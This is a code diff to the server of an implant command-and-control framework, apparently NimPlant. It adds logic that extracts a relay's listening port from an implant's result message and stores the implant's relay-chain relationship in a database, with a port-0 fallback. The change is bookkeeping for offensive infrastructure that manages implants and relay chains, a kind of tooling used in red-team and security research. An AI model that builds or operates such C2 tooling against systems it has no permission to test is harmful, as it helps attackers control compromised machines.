@@ -914,6 +914,21 @@ def nim_implants_server(xor_key):
                         db.db_update_nimplant_relay_role(np.guid, new_role)
                         utils.nimplant_print(f"DEBUG: Updated {np.guid} role to {new_role}")
                         
+                        # Extract port number from result_data (format: "Relay server started on port 9999")
+                        try:
+                            port_str = result_data.split("port")[-1].strip().split()[0]
+                            listening_port = int(port_str)
+                            utils.nimplant_print(f"DEBUG: Extracted listening port: {listening_port}")
+                            
+                            # Store chain relationship with parent=None (direct C2 connection)
+                            db.db_store_chain_relationship(np.guid, None, new_role, listening_port)
+                            utils.nimplant_print(f"DEBUG: 🔗 Stored chain relationship: {np.guid} (role={new_role}, port={listening_port}, parent=None)")
+                        except (ValueError, IndexError) as e:
+                            utils.nimplant_print(f"DEBUG: WARNING - Could not extract port from result: {e}")
+                            # Store with port=0 as fallback
+                            db.db_store_chain_relationship(np.guid, None, new_role, 0)
+                            utils.nimplant_print(f"DEBUG: 🔗 Stored chain relationship with port=0 fallback")
+                        
                     elif "Relay server stopped" in result_data or "Failed to start relay" in result_data:
                         # Get current relay role to determine transition
                         current_role = db.db_get_nimplant_relay_role(np.guid) or "STANDARD"
